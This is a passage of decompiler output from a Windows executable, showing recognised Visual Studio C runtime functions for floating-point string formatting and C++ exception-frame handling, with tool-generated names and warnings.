    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2008 Release

void __cfltcvt_init(void)

{
  PTR_LAB_0042ade0 = __cfltcvt;
  PTR_LAB_0042ade4 = __cropzeros;
  PTR_LAB_0042ade8 = __fassign;
  PTR_LAB_0042adec = __forcdecpt;
  PTR_LAB_0042adf0 = __positive;
  PTR_LAB_0042adf4 = __cfltcvt;
  PTR_LAB_0042adf8 = __cfltcvt_l;
  PTR_LAB_0042adfc = __fassign_l;
  PTR_LAB_0042ae00 = __cropzeros_l;
  PTR_LAB_0042ae04 = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2008 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_0042d76c = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_0041d520(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_0042d778 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
  undefined4 *unaff_FS_OFFSET;
  
  *unaff_FS_OFFSET = *(undefined4 *)*unaff_FS_OFFSET;
                    // WARNING: Could not recover jumptable at 0x0041d5f6. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x0041d602. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  undefined4 *puVar1;
  undefined4 *unaff_FS_OFFSET;
  
  puVar1 = (undefined4 *)*unaff_FS_OFFSET;
  RtlUnwind(param_1,(PVOID)0x41d62f,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *puVar1 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = puVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  uint *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int *unaff_FS_OFFSET;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x41d76c;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_0042a044 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)*unaff_FS_OFFSET;
    *unaff_FS_OFFSET = (int)&local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 == 0) {
      *unaff_FS_OFFSET = (int)local_2c;
    }
    else {
      *local_2c = *(undefined4 *)*unaff_FS_OFFSET;
      *unaff_FS_OFFSET = (int)local_2c;
    }
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x0041d82f. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  iVar1 = *(int *)(param_1 + 0x10);
  uVar6 = *(uint *)(param_1 + 0xc);
  uVar2 = uVar6;
  uVar4 = uVar6;
  while (uVar5 = uVar2, -1 < param_2) {
    if (uVar6 == 0xffffffff) {
      _inconsistency();
    }
    uVar6 = uVar6 - 1;
    iVar3 = uVar6 * 0x14 + iVar1;
    if (((*(int *)(iVar3 + 4) < param_3) && (param_3 <= *(int *)(iVar3 + 8))) ||
       (uVar2 = uVar5, uVar6 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar6;
      uVar4 = uVar5;
    }
  }
  uVar6 = uVar6 + 1;
  *param_4 = uVar6;
  *param_5 = uVar4;
  if ((*(uint *)(param_1 + 0xc) < uVar4) || (uVar4 < uVar6)) {
    _inconsistency();
  }
  return (_s_TryBlockMapEntry *)(uVar6 * 0x14 + iVar1);
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  int **unaff_FS_OFFSET;
  int *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_0042a044 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  *unaff_FS_OFFSET = local_1c;
  return pvVar1;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2008 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,s_e_000_004286ac);
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_0042d770 & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_0041ddfd:
    *piVar2 = iVar15;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_0041ddfd;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_0041e121;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_0041e0d0:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_0041e0db;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_0041e0d0;
LAB_0041e0db:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_0041e121:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
